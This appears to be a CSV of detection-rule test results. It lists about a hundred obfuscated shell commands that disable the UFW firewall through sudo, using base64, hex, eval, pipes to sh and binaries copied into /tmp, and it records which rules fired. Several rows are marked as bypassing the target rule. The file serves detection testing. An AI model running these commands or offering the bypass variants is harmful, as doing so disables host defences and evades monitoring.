ID,Command,Log File,Result,All Detected Rules
116,"sudo /usr/sbin/ufw $(awk '{print}' <<< ""disable"")",Ufw_Force_Stop_Using_Ufw-Init_attack116.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
117,"sudo /usr/sbin/ufw $(echo disable | cut -d"" "" -f1)",Ufw_Force_Stop_Using_Ufw-Init_attack117.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
118,"DIS=""dis""; ABLE=""able""; sudo /usr/sbin/ufw $DIS$ABLE",Ufw_Force_Stop_Using_Ufw-Init_attack118.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
119,sudo /usr/sbin/ufw $(echo d i s a b l e | awk '{print $1$2$3$4$5$6$7}'),Ufw_Force_Stop_Using_Ufw-Init_attack119.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
120,"sudo /usr/sbin/ufw $(perl -e 'print ""disable""')",Ufw_Force_Stop_Using_Ufw-Init_attack120.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
121,"sudo /usr/sbin/ufw $(echo -n ""disable"" | tr -d '\n')",Ufw_Force_Stop_Using_Ufw-Init_attack121.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
122,echo disable > /tmp/d; sudo /usr/sbin/ufw $(cat /tmp/d),Ufw_Force_Stop_Using_Ufw-Init_attack122.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
123,"bash -c ""sudo /usr/sbin/ufw disable""",Ufw_Force_Stop_Using_Ufw-Init_attack123.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
124,sudo $(which ufw) disable,Ufw_Force_Stop_Using_Ufw-Init_attack124.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
125,U=/usr/sbin/ufw; sudo $U disable,Ufw_Force_Stop_Using_Ufw-Init_attack125.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
126,"echo ""/usr/sbin/ufw disable"" | sudo bash",Ufw_Force_Stop_Using_Ufw-Init_attack126.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
127,for i in /usr/sbin/ufw; do sudo $i disable; done,Ufw_Force_Stop_Using_Ufw-Init_attack127.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
128,DISABLE=disable && sudo /usr/sbin/ufw $DISABLE,Ufw_Force_Stop_Using_Ufw-Init_attack128.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
129,"xargs -I{} sudo /usr/sbin/ufw {} <<< ""disable""",Ufw_Force_Stop_Using_Ufw-Init_attack129.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
130,"sudo /usr/sbin/ufw $(echo ""$((1+1))"" | sed 's/2/disable/')",Ufw_Force_Stop_Using_Ufw-Init_attack130.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
131,"sudo /usr/sbin/ufw $(python3 -c 'print(""disable"")')",Ufw_Force_Stop_Using_Ufw-Init_attack131.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
132,"echo -e ""disable"" | while read cmd; do sudo /usr/sbin/ufw $cmd; done",Ufw_Force_Stop_Using_Ufw-Init_attack132.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
133,CMD=$(echo disable); sudo /usr/sbin/ufw $CMD,Ufw_Force_Stop_Using_Ufw-Init_attack133.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
134,"DIS=""disa""; BLE=""ble""; sudo /usr/sbin/ufw ""$DIS$BLE""",Ufw_Force_Stop_Using_Ufw-Init_attack134.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
135,"sudo /usr/sbin/ufw $((12345+54321)) | grep -q ""disable"" || sudo /usr/sbin/ufw disable",Ufw_Force_Stop_Using_Ufw-Init_attack135.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
136,z=$(echo d i s a b l e | sed 's/ //g'); sudo /usr/sbin/ufw $z,Ufw_Force_Stop_Using_Ufw-Init_attack136.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
137,"A=""disable""; sudo /usr/sbin/ufw $A",Ufw_Force_Stop_Using_Ufw-Init_attack137.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
138,echo sudo /usr/sbin/ufw disable | sh,Ufw_Force_Stop_Using_Ufw-Init_attack138.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
139,eval sudo /usr/sbin/ufw$(echo \ disable),Ufw_Force_Stop_Using_Ufw-Init_attack139.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
140,echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d | sh,Ufw_Force_Stop_Using_Ufw-Init_attack140.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | Linux Base64 Encoded Pipe to Shell
141,"echo ""sudo /usr/sbin/ufw disable"" | base64 | xargs | base64 -d | sh",Ufw_Force_Stop_Using_Ufw-Init_attack141.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | Linux Base64 Encoded Pipe to Shell
142,echo '7375646f202f7573722f7362696e2f7566772064697361626c65' | xxd -r -p | sh,Ufw_Force_Stop_Using_Ufw-Init_attack142.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
143,"python3 -c ""import base64;import os;os.system(base64.b64decode('c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=').decode())""",Ufw_Force_Stop_Using_Ufw-Init_attack143.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
144,echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d | sudo sh,Ufw_Force_Stop_Using_Ufw-Init_attack144.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
145,printf '\x73\x75\x64\x6f\x20\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65' | sh,Ufw_Force_Stop_Using_Ufw-Init_attack145.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
146,"sudo perl -e 'system(""ufw disable"")'",Ufw_Force_Stop_Using_Ufw-Init_attack146.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
147,"sudo perl -e 'system(""\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65"")'",Ufw_Force_Stop_Using_Ufw-Init_attack147.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
148,"echo -e ""sudo /usr/sbin/ufw disable"" > /tmp/.cmd && sh /tmp/.cmd",Ufw_Force_Stop_Using_Ufw-Init_attack148.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
149,echo -e '\x73\x75\x64\x6f\x20\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65' | sh,Ufw_Force_Stop_Using_Ufw-Init_attack149.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
150,"sudo sh -c ""$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack150.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
151,"bash -c ""$(echo 'c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU=' | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack151.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
152,"python3 -c ""exec('import os; os.system(\""/usr/sbin/ufw disable\"")')""",Ufw_Force_Stop_Using_Ufw-Init_attack152.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
153,"python3 -c ""exec('import os\\nos.system(\\\""/usr/sbin/ufw disable\\\"")')""",Ufw_Force_Stop_Using_Ufw-Init_attack153.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
154,"sudo $(echo ""/usr/sbin/ufw disable"" | base64 | base64 -d)",Ufw_Force_Stop_Using_Ufw-Init_attack154.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
155,"sudo sh -c ""$(printf '\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65')""",Ufw_Force_Stop_Using_Ufw-Init_attack155.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
156,"sh -c ""$(echo 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack156.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
157,"eval ""$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack157.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
158,"sudo sh -c ""$(xxd -r -p <<< '7375646f202f7573722f7362696e2f7566772064697361626c65')""",Ufw_Force_Stop_Using_Ufw-Init_attack158.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
159,"sudo python3 -c ""exec('import os; os.system(\\\""/usr/sbin/ufw disable\\\"")')""",Ufw_Force_Stop_Using_Ufw-Init_attack159.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
160,"sudo bash -c ""eval \$(echo c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU= | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack160.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
161,sudo echo 'dWZ3IGRpc2FibGU=' | base64 -d | sh,Ufw_Force_Stop_Using_Ufw-Init_attack161.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | Linux Base64 Encoded Pipe to Shell
162,sudo echo 'ufw disable' > /tmp/x && bash /tmp/x,Ufw_Force_Stop_Using_Ufw-Init_attack162.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
163,"bash -c ""$(echo '7375646f202f7573722f7362696e2f7566772064697361626c65' | xxd -r -p)""",Ufw_Force_Stop_Using_Ufw-Init_attack163.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
164,"python3 -c 'import os; os.system(bytes.fromhex(""7375646f202f7573722f7362696e2f7566772064697361626c65"").decode())'",Ufw_Force_Stop_Using_Ufw-Init_attack164.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
165,"sudo sh -c ""$(perl -MMIME::Base64 -e 'print decode_base64(""c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU="")')""",Ufw_Force_Stop_Using_Ufw-Init_attack165.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
166,"sudo sh -c ""$(echo -n 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack166.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
167,"sudo sh -c ""$(python3 -c 'import base64; print(base64.b64decode(""c3VkbyAvdXNyL3NiaW4vdWZ3IGRpc2FibGU="").decode())')""",Ufw_Force_Stop_Using_Ufw-Init_attack167.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
168,"sudo bash -c ""$(perl -e 'print pack(""H*"", ""7375646f202f7573722f7362696e2f7566772064697361626c65"")')""",Ufw_Force_Stop_Using_Ufw-Init_attack168.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
169,"sudo $(cat <<< ""/usr/sbin/ufw disable"")",Ufw_Force_Stop_Using_Ufw-Init_attack169.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
170,"sudo sh -c ""$(xxd -r -p <<< 7375646f202f7573722f7362696e2f7566772064697361626c65)""",Ufw_Force_Stop_Using_Ufw-Init_attack170.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
171,"sudo bash -c ""$(echo -e '\u0075\u0066\u0077\u0020\u0064\u0069\u0073\u0061\u0062\u006c\u0065')""",Ufw_Force_Stop_Using_Ufw-Init_attack171.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
172,sudo $(echo -e '\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x75\x66\x77') disable,Ufw_Force_Stop_Using_Ufw-Init_attack172.log,Bypass Target Rule,Potential Suspicious Change To Sensitive/Critical Files | Syslog Clearing or Removal Via System Utilities
173,sudo $(printf '/usr/sbin/%s\n' 'ufw') disable,Ufw_Force_Stop_Using_Ufw-Init_attack173.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
174,A='/usr/sbin/ufw'; B='disable'; sudo $A $B,Ufw_Force_Stop_Using_Ufw-Init_attack174.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
175,CMD=$(echo dWZ3IGRpc2FibGU= | base64 -d); sudo /usr/sbin/$CMD,Ufw_Force_Stop_Using_Ufw-Init_attack175.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
176,CMD=$(echo ZGlzYWJsZQ== | base64 -d); sudo /usr/sbin/ufw $CMD,Ufw_Force_Stop_Using_Ufw-Init_attack176.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
177,VAR1='ufw'; VAR2='disable'; sudo /usr/sbin/$VAR1 $VAR2,Ufw_Force_Stop_Using_Ufw-Init_attack177.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
178,"python3 -c ""import os; os.system('\u0075\u0066\u0077\u0020\u0064\u0069\u0073\u0061\u0062\u006c\u0065')""",Ufw_Force_Stop_Using_Ufw-Init_attack178.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
179,"sudo perl -e 'print ""\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65\n""' | sh",Ufw_Force_Stop_Using_Ufw-Init_attack179.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
180,sudo /usr/sbin/$(echo 'ufw' | tr -d '\n') $(echo 'disable' | tr -d '\n'),Ufw_Force_Stop_Using_Ufw-Init_attack180.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
181,"sudo bash -c ""$(python3 -c 'import base64; print(base64.b64decode(""dWZ3IGRpc2FibGU="").decode())')""",Ufw_Force_Stop_Using_Ufw-Init_attack181.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
182,"sudo bash -c ""$(perl -e 'print pack(""C*"",117,102,119,32,100,105,115,97,98,108,101)')""",Ufw_Force_Stop_Using_Ufw-Init_attack182.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
183,"sudo bash -c ""$(cat <<< $'\x75\x66\x77\x20\x64\x69\x73\x61\x62\x6c\x65')""",Ufw_Force_Stop_Using_Ufw-Init_attack183.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
184,"sudo sh -c ""$(echo 'sudo /usr/sbin/ufw disable' | base64 | base64 -d)""",Ufw_Force_Stop_Using_Ufw-Init_attack184.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
185,"echo -n ""sudo /usr/sbin/ufw disable"" > /tmp/.hidden && sudo bash /tmp/.hidden",Ufw_Force_Stop_Using_Ufw-Init_attack185.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
186,sudo /usr/sbin/ufw $(printf '\x64\x69\x73\x61\x62\x6c\x65'),Ufw_Force_Stop_Using_Ufw-Init_attack186.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
187,"sudo /usr/sbin/ufw $(echo ""ZGlzYWJsZQ=="" | base64 -d)",Ufw_Force_Stop_Using_Ufw-Init_attack187.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text
188,A=$(printf '\x64\x69\x73\x61\x62\x6c\x65'); sudo /usr/sbin/ufw $A,Ufw_Force_Stop_Using_Ufw-Init_attack188.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
189,cp /usr/sbin/ufw /tmp/fw; sudo /tmp/fw disable,Ufw_Force_Stop_Using_Ufw-Init_attack189.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
190,cp /usr/sbin/ufw /tmp/firewall; sudo /tmp/firewall disable,Ufw_Force_Stop_Using_Ufw-Init_attack190.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
191,cp /usr/sbin/ufw /tmp/a.out; sudo /tmp/a.out disable,Ufw_Force_Stop_Using_Ufw-Init_attack191.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
192,cp /usr/sbin/ufw /tmp/ufw_bak; sudo /tmp/ufw_bak disable,Ufw_Force_Stop_Using_Ufw-Init_attack192.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
193,cp /usr/sbin/ufw /tmp/ufw2; sudo /tmp/ufw2 disable,Ufw_Force_Stop_Using_Ufw-Init_attack193.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
194,cp /usr/sbin/ufw /tmp/stopper; sudo /tmp/stopper disable,Ufw_Force_Stop_Using_Ufw-Init_attack194.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
195,cp /usr/sbin/ufw /tmp/cmd; sudo /tmp/cmd disable,Ufw_Force_Stop_Using_Ufw-Init_attack195.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
196,cp /usr/sbin/ufw /tmp/netctl; sudo /tmp/netctl disable,Ufw_Force_Stop_Using_Ufw-Init_attack196.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
197,cp /usr/sbin/ufw /tmp/fwctl; sudo /tmp/fwctl disable,Ufw_Force_Stop_Using_Ufw-Init_attack197.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
198,cp /usr/sbin/ufw /tmp/u; sudo /tmp/u disable,Ufw_Force_Stop_Using_Ufw-Init_attack198.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
199,ln -s /usr/sbin/ufw /tmp/f; sudo /tmp/f disable,Ufw_Force_Stop_Using_Ufw-Init_attack199.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
200,ln -s /usr/sbin/ufw /tmp/ufwlink; sudo /tmp/ufwlink disable,Ufw_Force_Stop_Using_Ufw-Init_attack200.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
201,ln -s /usr/sbin/ufw /tmp/shield; sudo /tmp/shield disable,Ufw_Force_Stop_Using_Ufw-Init_attack201.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
202,ln -s /usr/sbin/ufw /tmp/dctl; sudo /tmp/dctl disable,Ufw_Force_Stop_Using_Ufw-Init_attack202.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
203,ln -s /usr/sbin/ufw /tmp/system_firewall; sudo /tmp/system_firewall disable,Ufw_Force_Stop_Using_Ufw-Init_attack203.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
204,install /usr/sbin/ufw /tmp/fwcopy; sudo /tmp/fwcopy disable,Ufw_Force_Stop_Using_Ufw-Init_attack204.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
205,cp /usr/sbin/ufw ~/ufw_hidden; sudo ~/ufw_hidden disable,Ufw_Force_Stop_Using_Ufw-Init_attack205.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
206,cp /usr/sbin/ufw /dev/shm/ufw_exec; sudo /dev/shm/ufw_exec disable,Ufw_Force_Stop_Using_Ufw-Init_attack206.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities
207,cp /usr/sbin/ufw /tmp/.ufw; sudo /tmp/.ufw disable,Ufw_Force_Stop_Using_Ufw-Init_attack207.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
208,cp /usr/sbin/ufw /tmp/.hidden_fw; sudo /tmp/.hidden_fw disable,Ufw_Force_Stop_Using_Ufw-Init_attack208.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
209,cp /usr/sbin/ufw /tmp/firewall_cmd; sudo /tmp/firewall_cmd disable,Ufw_Force_Stop_Using_Ufw-Init_attack209.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
210,cp /usr/sbin/ufw /var/tmp/fwdaemon; sudo /var/tmp/fwdaemon disable,Ufw_Force_Stop_Using_Ufw-Init_attack210.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
211,cp /usr/sbin/ufw /tmp/fwexec; chmod +x /tmp/fwexec; sudo /tmp/fwexec disable,Ufw_Force_Stop_Using_Ufw-Init_attack211.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | Execution Of Script Located In Potentially Suspicious Directory
212,ln -s /usr/sbin/ufw /tmp/sbin_ufw; sudo /tmp/sbin_ufw disable,Ufw_Force_Stop_Using_Ufw-Init_attack212.log,Trigger: Ufw Force Stop Using Ufw-Init,Ufw Force Stop Using Ufw-Init | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
